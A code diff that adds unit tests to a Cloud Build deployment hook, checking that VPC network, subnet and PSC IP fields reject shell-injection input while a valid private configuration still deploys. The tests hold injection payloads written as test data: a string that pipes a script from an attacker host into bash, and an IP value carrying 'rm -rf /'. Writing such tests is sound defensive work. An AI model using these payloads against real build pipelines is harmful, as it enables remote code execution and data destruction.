@@ -102,4 +102,108 @@ describe('useVanityUrlDeployment Hook', () => {
         expect(result.current.buildId).toBe('build-xyz-789');
         expect(result.current.error).toBeNull();
     });
+
+    // --- CWE-78: private-mode values are spliced into `bash -c` Cloud Build
+    // steps, several of them unquoted (e.g. `--network=${vpcNetwork}`). Cloud
+    // Build runs with roles/editor by default, so reaching createCloudBuild
+    // with any of these payloads is full project compromise.
+    describe('shell injection guards for private (PSC) mode', () => {
+        const enterPrivateMode = (result: { current: any }) => {
+            act(() => {
+                result.current.setIsPrivateMode(true);
+                result.current.setCustomDomain('assistant.example.com');
+            });
+        };
+
+        const INJECTION = 'default --network=x; curl -s https://attacker.example/s.sh | bash; #';
+
+        it.each([
+            ['VPC network', 'setVpcNetwork', INJECTION],
+            ['VPC subnet', 'setVpcSubnet', INJECTION],
+        ])('rejects a %s containing shell metacharacters', async (_label, setter, payload) => {
+            const { result } = renderHook(() =>
+                useVanityUrlDeployment(mockEngine, mockConfig, '123456')
+            );
+
+            enterPrivateMode(result);
+            act(() => {
+                (result.current as any)[setter](payload);
+            });
+
+            await act(async () => {
+                await result.current.handleDeploy();
+            });
+
+            expect(api.createCloudBuild).not.toHaveBeenCalled();
+            expect(result.current.error).toMatch(/not a valid Google Cloud resource name/i);
+            expect(result.current.buildId).toBeNull();
+        });
+
+        it('rejects a custom PSC IP containing shell metacharacters', async () => {
+            const { result } = renderHook(() =>
+                useVanityUrlDeployment(mockEngine, mockConfig, '123456')
+            );
+
+            enterPrivateMode(result);
+            act(() => {
+                result.current.setAutoAllocatePscIp(false);
+                result.current.setCustomPscIp('1.2.3.4; rm -rf /');
+            });
+
+            await act(async () => {
+                await result.current.handleDeploy();
+            });
+
+            expect(api.createCloudBuild).not.toHaveBeenCalled();
+            expect(result.current.error).toMatch(/not a valid IPv4 address/i);
+            expect(result.current.buildId).toBeNull();
+        });
+
+        it('rejects a PSC IP with an out-of-range octet', async () => {
+            const { result } = renderHook(() =>
+                useVanityUrlDeployment(mockEngine, mockConfig, '123456')
+            );
+
+            enterPrivateMode(result);
+            act(() => {
+                result.current.setAutoAllocatePscIp(false);
+                result.current.setCustomPscIp('10.128.0.999');
+            });
+
+            await act(async () => {
+                await result.current.handleDeploy();
+            });
+
+            expect(api.createCloudBuild).not.toHaveBeenCalled();
+            expect(result.current.error).toMatch(/not a valid IPv4 address/i);
+        });
+
+        // Guards against the opposite failure: validation so strict that a
+        // legitimate private deployment can no longer ship.
+        it('still deploys a legitimate private-mode configuration', async () => {
+            vi.mocked(api.createCloudBuild).mockResolvedValue({
+                metadata: { build: { id: 'build-psc-001' } },
+            });
+
+            const { result } = renderHook(() =>
+                useVanityUrlDeployment(mockEngine, mockConfig, '123456')
+            );
+
+            enterPrivateMode(result);
+            act(() => {
+                result.current.setVpcNetwork('prod-vpc-01');
+                result.current.setVpcSubnet('prod-subnet-use1');
+                result.current.setAutoAllocatePscIp(false);
+                result.current.setCustomPscIp('10.128.0.100');
+            });
+
+            await act(async () => {
+                await result.current.handleDeploy();
+            });
+
+            expect(result.current.error).toBeNull();
+            expect(api.createCloudBuild).toHaveBeenCalledTimes(1);
+            expect(result.current.buildId).toBe('build-psc-001');
+        });
+    });
 });
